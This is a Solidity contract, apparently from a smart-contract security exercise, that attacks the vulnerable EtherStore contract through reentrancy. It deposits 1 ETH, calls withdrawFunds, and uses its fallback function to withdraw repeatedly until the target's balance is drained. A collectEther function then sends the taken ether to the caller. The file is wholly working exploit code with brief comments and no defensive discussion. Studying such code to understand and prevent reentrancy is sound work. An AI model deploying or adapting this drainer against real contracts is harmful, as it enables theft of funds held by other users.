pragma solidity 0.4.26;

import "./EtherStore.sol";

/**
 * @dev Attack the EtherStore.sol Smart Contract
 */
contract attackEtherStore {
    EtherStore public etherStore;

    /**
    * @dev Initialize and point the public variable `etherStore` to the contract
    * to be attacked (EtherStore.sol)
    */
    constructor(address _etherStoreAddress) public {
          etherStore = EtherStore(_etherStoreAddress);
    }

    /**
    * @dev Attack the EtherStore Smart Contract
    */
    function attackEStore() public payable {

        //It is necesary a balance of 1 ETH for calling withdrawFunds
        require(msg.value >= 1 ether);

        //Send ETH to the depositFunds() function
        etherStore.depositFunds.value(1 ether)();

        //Start the Attact
        etherStore.withdrawFunds(1 ether);
    }

    /**
    * @dev Fallback function where the attack happens
    */
    function () external payable {
        if (address(etherStore).balance > 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }

    /**
    * @dev Transfer the balance of the Attack Smart Contract to the msg.sender account.
    */
    function collectEther() public {
        msg.sender.transfer(address(this).balance);
    }

    /**
     * @dev return the smart contract balance
     */
    function getBalance () public view returns (uint256) {
        return address(this).balance;
    }
}
